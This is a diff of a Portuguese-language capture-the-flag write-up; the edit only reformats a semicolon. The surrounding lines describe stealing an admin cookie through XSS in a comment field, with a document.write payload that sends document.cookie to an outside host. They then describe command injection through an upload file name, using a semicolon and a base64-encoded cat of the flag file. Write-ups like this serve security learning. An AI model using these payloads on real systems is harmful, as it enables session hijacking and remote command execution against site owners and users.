@@ -8,7 +8,7 @@ Nos comentários era possivel o ataque XSS, conseguimos roubar o cookie do admin
 document.write('<img src="https://318.server/givme?cookie=' + document.cookie + '" />')
 ```
 
-Feito isso, assumindo o login de admin, era apresentado uma opção a mais no menu de um form de upload, logo na primeira tentativa, era possivel notar que o sistema utilizava o binário file, com isso conseguimos executar comandos, utilizando o char ''';'''
+Feito isso, assumindo o login de admin, era apresentado uma opção a mais no menu de um form de upload, logo na primeira tentativa, era possivel notar que o sistema utilizava o binário file, com isso conseguimos executar comandos, utilizando o char **;**
 
 ```
 'lol.jpg;echo Y2F0IC9mbGFnLnR4dAo=|base64 -d'
